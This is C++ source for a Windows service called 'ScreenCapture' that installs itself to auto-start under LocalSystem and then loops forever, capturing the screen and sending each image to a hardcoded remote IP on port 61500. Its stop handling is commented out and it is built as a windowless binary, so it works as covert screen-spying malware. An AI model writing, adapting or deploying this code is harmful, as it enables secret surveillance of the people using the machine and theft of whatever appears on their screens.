//===========================================================================//
//===========================================================================//
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <windows.h>
#include <tchar.h>

#include "helper.h"
#include "network.h"
#include "screen_manager.h"

using namespace std;

ofstream output;
//===========================================================================//
//===========================================================================//

//------------------------------------------------------------------------------

#define SVCNAME TEXT("ScreenCapture")

SERVICE_STATUS          gSvcStatus;
SERVICE_STATUS_HANDLE   gSvcStatusHandle;
HANDLE                  ghSvcStopEvent = NULL;

VOID SvcInstall(void);
VOID WINAPI SvcCtrlHandler(DWORD);
VOID WINAPI SvcMain(DWORD, LPTSTR*);

VOID ReportSvcStatus(DWORD, DWORD, DWORD);
VOID SvcInit(DWORD, LPTSTR*);
VOID SvcReportEvent(string);

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

int __cdecl _tmain(int argc, TCHAR *argv[]) {
    if (lstrcmpi(argv[1], TEXT("install")) == 0) {
        SvcInstall();
        return 0;
    }

    if (lstrcmpi(argv[1], TEXT("debug")) == 0) {
        return 0;
    }

    SERVICE_TABLE_ENTRY DispatchTable[] = {
        {(char*)SVCNAME, (LPSERVICE_MAIN_FUNCTION) SvcMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(DispatchTable)) {
        SvcReportEvent("StartServiceCtrlDispatcher");
    }
}

//------------------------------------------------------------------------------

void SvcInstall() {
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    TCHAR szPath[MAX_PATH];

    if (!GetModuleFileName(NULL, szPath, MAX_PATH)) {
        cout << "Cannot install service (" << GetLastError() << ")" << endl;
        return;
    }

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (NULL == schSCManager) {
        cout << "OpenSCManager failed (" << GetLastError() << ")" << endl;
        return;
    }

    schService = CreateService(
        schSCManager,              // SCM database
        SVCNAME,                   // name of service
        SVCNAME,                   // service name to display
        SERVICE_ALL_ACCESS,        // desired access
        SERVICE_WIN32_OWN_PROCESS, // service type
        SERVICE_AUTO_START,        // start type
        SERVICE_ERROR_NORMAL,      // error control type
        szPath,                    // path to service's binary
        NULL,                      // no load ordering group
        NULL,                      // no tag identifier
        NULL,                      // no dependencies
        NULL,                      // LocalSystem account
        NULL);                     // no password

    if (schService == NULL) {
        cout << "CreateService failed (" << GetLastError() << ")" << endl;
        CloseServiceHandle(schSCManager);
        return;
    } else {
        cout << "Service installed successfully" << endl;
    }

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

//------------------------------------------------------------------------------

void WINAPI SvcMain(DWORD dwArgc, LPTSTR *lpszArgv) {
    gSvcStatusHandle = RegisterServiceCtrlHandler(SVCNAME, SvcCtrlHandler);

    if (!gSvcStatusHandle) {
        SvcReportEvent("RegisterServiceCtrlHandler");
        return;
    }

    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    gSvcStatus.dwServiceSpecificExitCode = 0;

    ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    SvcInit(dwArgc, lpszArgv);
}

//------------------------------------------------------------------------------

void SvcInit (DWORD dwArgc, LPTSTR *lpszArgv) {
    // TO_DO: Declare and set any required variables.
    //   Be sure to periodically call ReportSvcStatus() with
    //   SERVICE_START_PENDING. If initialization fails, call
    //   ReportSvcStatus with SERVICE_STOPPED.

    // Create an event. The control handler function, SvcCtrlHandler,
    // signals this event when it receives the stop control code.

    ghSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (ghSvcStopEvent == NULL) {
        ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
        return;
    }

    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);

    // TO_DO: Perform work until service stops.

    //========================================================================//
    //========================================================================//
    TCHAR service_path[MAX_PATH];
    GetModuleFileName(NULL, service_path, MAX_PATH);
    string spath;
    spath += service_path;
    spath += "\\cout.txt";

    streambuf* sbuf = cout.rdbuf();
    output.open(spath.c_str());
    cout.rdbuf(output.rdbuf());

    cout << "PATH: " << spath << endl;

    ScreenManager screen_manager = ScreenManager();

    // string hostname = "192.241.213.182";
    string hostname = "192.168.0.118";
    SOCKET socket = 0;
    //========================================================================//
    //========================================================================//

    while (1) {
        //====================================================================//
        //====================================================================//
        if (socket == 0) {
            socket = connect(hostname, 61500);
        }

        if (socket != 0) {
            string image = screen_manager.capture();
            send_image(socket, image, hostname);
        }

        wait();
        //====================================================================//
        //====================================================================//

        // Check whether to stop the service.
        // WaitForSingleObject(ghSvcStopEvent, INFINITE);
        // ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
        // return;
    }

    //========================================================================//
    //========================================================================//
    if (socket != 0) {
        disconnect(socket);
    }

    cout << flush;
    //========================================================================//
    //========================================================================//
}

//------------------------------------------------------------------------------

void ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    static DWORD dwCheckPoint = 1;

    gSvcStatus.dwCurrentState = dwCurrentState;
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    gSvcStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        gSvcStatus.dwControlsAccepted = 0;
    else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
        gSvcStatus.dwCheckPoint = 0;
    else gSvcStatus.dwCheckPoint = dwCheckPoint++;

    SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
}

//------------------------------------------------------------------------------

void WINAPI SvcCtrlHandler(DWORD dwCtrl) {
    switch (dwCtrl) {
        case SERVICE_CONTROL_STOP:
            ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);

            // Signal the service to stop.

            SetEvent(ghSvcStopEvent);
            ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);

            return;
        case SERVICE_CONTROL_INTERROGATE:
            break;
        default:
            break;
    }
}

//------------------------------------------------------------------------------

void SvcReportEvent(string szFunction) {
    HANDLE hEventSource;
    LPCTSTR lpszStrings[2];
    ostringstream buffer;

    hEventSource = RegisterEventSource(NULL, SVCNAME);

    if (NULL != hEventSource) {
        buffer << szFunction << " failed with " << GetLastError();

        lpszStrings[0] = SVCNAME;
        lpszStrings[1] = buffer.str().c_str();

        ReportEvent(hEventSource,        // event log handle
                    EVENTLOG_ERROR_TYPE, // event type
                    0,                   // event category
                    61500,               // event identifier
                    NULL,                // no security identifier
                    2,                   // size of lpszStrings array
                    0,                   // no binary data
                    lpszStrings,         // array of strings
                    NULL);               // no binary data

        DeregisterEventSource(hEventSource);
    }
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

// i586-mingw32msvc-g++ -mwindows -o service.exe service.cpp
